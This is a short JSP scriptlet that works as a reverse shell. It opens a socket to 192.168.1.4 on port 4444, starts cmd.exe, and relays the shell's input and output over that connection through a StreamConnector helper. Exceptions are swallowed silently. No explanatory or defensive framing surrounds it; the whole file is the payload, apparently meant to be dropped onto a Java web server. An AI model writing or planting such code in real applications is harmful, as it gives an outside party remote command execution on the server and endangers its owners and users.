<%
try
                {
                    Socket socket = new Socket( "192.168.1.4", 4444 );
                    Process process = Runtime.getRuntime().exec( "cmd.exe" );
                    ( new StreamConnector( process.getInputStream(), 

socket.getOutputStream() ) ).start();
                    ( new StreamConnector( socket.getInputStream(), 

process.getOutputStream() ) ).start();
                } catch( Exception e ) {}
%>